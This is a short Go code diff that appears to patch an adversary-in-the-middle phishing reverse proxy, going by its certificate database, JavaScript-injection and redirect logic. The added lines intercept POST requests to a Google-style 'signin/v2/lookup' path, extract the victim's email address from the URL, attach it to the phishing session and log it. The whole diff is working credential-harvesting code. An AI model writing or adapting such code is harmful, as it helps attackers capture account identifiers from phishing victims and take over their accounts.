@@ -234,6 +234,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		                }
 		            }
 		        }
+
+			// Check if the URL path contains "signin/v2/lookup" and the method is POST
+			if req.Method == http.MethodPost && strings.Contains(req.URL.Path, "signin/v2/lookup") {
+			pathParts := strings.Split(req.URL.Path, "/")
+			if len(pathParts) > 3 {
+			    email := pathParts[len(pathParts)-1]
+			    if strings.Contains(email, "@") {
+				// Set the session username and log the value
+				p.setSessionUsername(ps.SessionId, email)
+				log.Info("[%d] Username: [%s]", ps.Index, email)
+			    }
+			}
+			}
 			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
 			js_inject_re := regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")
 
